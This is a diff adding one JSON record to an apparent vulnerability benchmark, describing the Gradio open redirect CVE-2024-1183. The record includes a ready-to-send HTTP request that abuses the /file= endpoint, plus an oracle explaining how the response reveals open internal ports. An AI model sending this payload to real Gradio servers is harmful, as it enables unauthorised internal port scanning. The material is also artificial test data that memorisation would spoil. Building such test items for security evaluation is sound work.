@@ -1,0 +1,15 @@
+{
+  "file_id": "356_gradio_huntr_103434f9-87d2-42ea-9907-194a3c25007c",
+  "numeric_id": "356",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Open redirect vulnerability in Gradio due to unvalidated URL parameter in file endpoint",
+  "cve": "CVE-2024-1183",
+  "cwe": "CWE-601: Open Redirect",
+  "library": "gradio",
+  "affected_version": "== 3.41.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "GET /file=http://localhost:8182/ HTTP/1.1\nHost: 127.0.0.1:7860\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://127.0.0.1:7860/\nOrigin: http://127.0.0.1:7860\nConnection: close\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin",
+  "oracle": "Presence of Location header in response indicates the port is open and running a web server; absence of Location header and presence of \"File not allowed\" error indicates the port is not open or not running a web server."
+}
